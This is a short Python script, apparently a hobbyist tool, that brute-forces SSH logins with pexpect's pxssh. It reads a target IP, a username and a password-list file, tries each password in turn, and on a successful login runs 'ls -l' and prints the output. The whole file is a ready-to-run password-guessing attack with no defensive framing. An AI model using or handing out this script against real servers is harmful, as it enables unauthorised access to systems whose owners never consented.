# -*- coding: UTF-8 -*-
import sys
from pexpect import pxssh
s = pxssh.pxssh()
def read_File(f, line):
    line = line.strip()  # 去空白
    print('try to login ...',line)
    return line

print('input ip hostname passwordlist')
print('example:')
print('127.0.0.1 root ./passwordlist.txt')

user_input = input()
ip, hostname, filepath = user_input.split(' ', 2)
f = open(filepath, 'r')
print('open file...')

# sys.exit()
#os.system('echo hello')
# ip = '127.0.0.1'
# hostname = 'user1'
# pd = '123456789a'
while 1:
    line = f.readline()
    if not line:
        break
    pd = read_File(f, line)
    s = pxssh.pxssh()
    try:
        if not s.login (ip, hostname, pd):
            print ("SSH session failed on login.")

    except pxssh.ExceptionPxssh as e:   #catch password error
        print(e)
    else:
        print ("SSH session login successful")
        s.sendline ('ls -l')
        s.prompt()         # print last command output
        print (s.before)   # print everything before the prompt.
        s.logout()
print('try all of case end')
sys.exit()

